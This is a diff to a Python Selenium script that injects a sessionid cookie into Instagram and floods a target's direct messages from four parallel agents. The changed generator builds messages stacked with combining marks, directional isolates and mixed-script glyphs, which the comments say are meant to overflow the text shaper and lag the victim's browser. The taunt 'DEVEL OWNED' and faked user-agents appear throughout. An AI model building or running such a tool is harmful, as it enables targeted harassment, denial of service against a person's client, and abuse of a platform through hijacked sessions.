@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (RAPID-NATIVE V81)
-# 📅 STATUS: QUAD-VELOCITY-ACTIVE | 4-AGENT TOTAL | AWS-HARD-KILL
+# 🚀 PROJECT: PRAVEER.OWNS (UNIQUE-NUCLEAR V82)
+# 📅 STATUS: CACHE-SHATTER-ACTIVE | 4-AGENT TOTAL | AWS-HARD-KILL
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -12,35 +12,37 @@ from selenium.webdriver.chrome.options import Options
 # --- ⚡ QUAD-VELOCITY CONFIG ---
 AGENTS_PER_MACHINE = 4             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.01, 0.08)  # 🔥 High-Frequency Delivery
-REST_AFTER_STRIKES = 500   
+BURST_SPEED = (0.01, 0.05)  # 🔥 MAXIMUM VELOCITY
+REST_AFTER_STRIKES = 600   
 REST_DURATION = 1          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_rapid_shaping_payload():
-    """Generates a high-speed payload that is mathematically heavy to render."""
-    u_id = random.randint(1000, 9999)
-    # \u2068 = FSI | \u2069 = PDI (Isolates)
-    # \u034F = CGJ (Combining Grapheme Joiner)
-    fsi, pdi, cgj = "\u2068", "\u2069", "\u034F"
-    # 80 Stacking marks (Sweet spot for speed vs lag)
-    marks = "".join([chr(i) for i in range(0x0300, 0x0350)]) 
-    glue = "\u2060" # Word Joiner
+def get_unique_nuclear_payload():
+    """Generates a mathematically unique payload to prevent browser caching."""
+    u_id = random.randint(100000, 999999)
+    # Mixing different high-plane scripts to force the shaper to switch fonts
+    # 𒀱 = Cuneiform | ﷽ = Arabic Wide | ⠟ = Braille
+    scripts = ["𒀱", "﷽", "𒈙", "⠟", "⡇", "🌙", "👑", "🔥"]
+    random.shuffle(scripts)
     
-    header = f"👑 PRAVEER PAPA 👑 SYSTEM [{u_id}]"
-    error_msg = f"ERROR: DEVEL HAS BEEN OWNED"
+    # Directional Isolates for Z-axis lag
+    lri, rli, pdi = "\u2066", "\u2067", "\u2069"
+    # 120 Stacking marks to overflow HarfBuzz
+    marks = "".join([chr(i) for i in range(0x0300, 0x036F)]) 
+    glue = "\u2060"
+    
+    header = f"👑 PRAVEER PAPA 👑 SYSTEM ERROR [{u_id}]"
     
     body = []
-    # 250 lines - Optimized for instant socket delivery
-    for i in range(250):
-        # We nest the error message in a shaping cluster
-        # This makes it look like standard text but lag like a nuclear block
-        nest = f"{fsi}P{marks}{cgj}R{marks}{cgj}A{marks}{cgj}V{marks}{cgj}EER{pdi}"
-        line = f"{nest} {error_msg} 🌙 {i}"
-        body.append(line)
+    # 300 lines of unique layout data
+    for i in range(300):
+        # Every line has a different directional nest and character sequence
+        # This makes 'String Interning' impossible for the browser
+        line = f"{lri}{rli}{random.choice(scripts)}{marks}{pdi*2}"
+        body.append(f"{line} DEVEL OWNED {i}{glue*3}")
         
     return f"{header}\n{glue.join(body)}".strip()[:9998]
 
@@ -53,7 +55,6 @@ def get_driver(agent_id):
         chrome_options.add_argument("--disable-gpu")
         chrome_options.binary_location = "/usr/bin/google-chrome"
         
-        # Randomized UA to stay safe
         ua = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14{random.randint(0,9)}.0.0.0 Safari/537.36"
         chrome_options.add_argument(f"user-agent={ua}")
         
@@ -89,19 +90,19 @@ def run_life_cycle(agent_id, cookie, target):
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
             driver.get(f"https://www.instagram.com/direct/t/{target}/")
-            time.sleep(12) 
+            time.sleep(15) 
             
             strike_count = 0
             while True:
-                payload = get_rapid_shaping_payload()
+                payload = get_unique_nuclear_payload()
                 if atomic_dispatch_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Rapid-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Unique-Strike ({GLOBAL_SENT})")
                     
-                    if strike_count % 100 == 0:
+                    if strike_count % 150 == 0:
                         driver.refresh()
                         time.sleep(5)
                 time.sleep(random.uniform(*BURST_SPEED))
